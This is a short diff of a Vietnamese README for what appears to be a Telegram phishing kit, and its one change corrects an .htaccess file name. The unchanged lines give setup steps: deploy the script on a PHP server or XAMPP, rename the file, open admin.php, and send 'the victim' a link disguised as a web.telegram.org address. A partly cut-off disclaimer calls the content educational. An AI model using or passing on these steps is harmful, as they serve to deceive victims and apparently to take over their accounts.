@@ -8,7 +8,7 @@ Tất cả nội dung, mã nguồn và công cụ được trình bày chỉ nh�
 
 Cách sử dụng script deploy lên sv có php, hoặc build local dùng xamp up vào thư mục htdocs
 
-Đổi tên file remoteme.htaccess thành .htaccess
+Đổi tên file removeme.htaccess thành .htaccess
 
 Ở máy mình mở urlweb/admin.php và gửi cho nạn nhân đường dẫn như https://web.telegram.org/k/#69
 
